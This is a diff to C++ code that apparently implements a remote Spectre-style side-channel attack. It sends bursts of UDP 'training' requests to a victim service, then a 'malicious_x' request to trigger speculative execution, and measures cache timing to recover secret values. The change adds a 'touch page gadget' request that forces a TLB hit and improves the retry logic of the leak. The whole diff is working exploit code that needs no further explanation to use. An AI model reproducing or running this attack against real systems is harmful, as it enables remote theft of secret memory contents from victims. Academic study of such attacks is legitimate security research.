@@ -532,13 +532,14 @@ inline void burst_train(SocketUDP& s, size_t training_x = 0) {
   // Initialize target x to send to victim:
   msg m = {};
   m.x = training_x;
+  m.fn = FN_PROCESS;
 
   // Send a burst of 5 training (valid) requests:
   for (size_t i = 0; i < BURST_COUNT; i++) {
     auto bytes = s.send(&m, sizeof(m));
     if ( unlikely(!(bytes > 0)) ) {
       // buffer/send error?
-      std::cerr << "Failed to send training_x: buffer/send error?" << std::endl;
+      std::cerr << "Failed to send training_x!" << std::endl;
     }
   }
 }
@@ -549,12 +550,29 @@ inline void speculate(SocketUDP& s, size_t malicious_x) {
   // Initialize target x to send to victim:
   msg m = {};
   m.x = malicious_x;
+  m.fn = FN_PROCESS;
 
   // Send a burst of 5 training (valid) requests:
   auto bytes = s.send(&m, sizeof(m));
   if ( unlikely(!(bytes > 0)) ) {
     // buffer/send error?
-    std::cerr << "Failed to send malicious_x: buffer/send error?" << std::endl;
+    std::cerr << "Failed to send malicious_x!" << std::endl;
+  }
+}
+
+
+inline void touch_page(SocketUDP& s, size_t malicious_x) {
+  // Send a single request with a malicious request:
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.x = malicious_x;
+  m.fn = FN_TOUCH_PAGE;
+
+  // Send a burst of 5 training (valid) requests:
+  auto bytes = s.send(&m, sizeof(m));
+  if ( unlikely(!(bytes > 0)) ) {
+    // buffer/send error?
+    std::cerr << "Failed to send FN_TOUCH_SECRET!" << std::endl;
   }
 }
 
@@ -602,7 +620,7 @@ void send_worker_v2(uint16_t port) {
 
       // Wait some amount of time (or for server reply -- but may be too slow):
 //      std::this_thread::sleep_for(std::chrono::microseconds(100));
-      const auto INITIAL_DELAY = std::chrono::microseconds(5);
+//      const auto INITIAL_DELAY = std::chrono::microseconds(5);
 
       // Measure speculative execution's impact on cache:
       // - measure after a predefined delay (or after event e.g. packet recv.)
@@ -694,18 +712,18 @@ void send_worker_v2(uint16_t port) {
     bool zero_value_prediciton = (counts_idx[0] == 0) &&
                                  !(sum == best && sum >= 2*MIN_MEASUREMENTS);
 
-    // Handle potential minor page fault as needed:
-    if (zero_value_prediciton) {
-      // Retry, doubling the number of measurments:
-      measurements *= 2;
-
-      // Force a TLB hit by triggering
-
-    }
-
     // Dynamic confidence adjustment:
     bool confident = single_contender || significant;
-    if (!confident) {
+
+    // Special Case: handle a potential minor page fault:
+    if (zero_value_prediciton) {
+      // Force a TLB hit by triggering a touch page gadget:
+      touch_page(s, malicious_x);
+
+      // Retry, doubling the number of measurments:
+      measurements *= 2;
+    }
+    else if (!confident) {
       // Retry, doubling the number of measurments:
       measurements *= 2;
     }
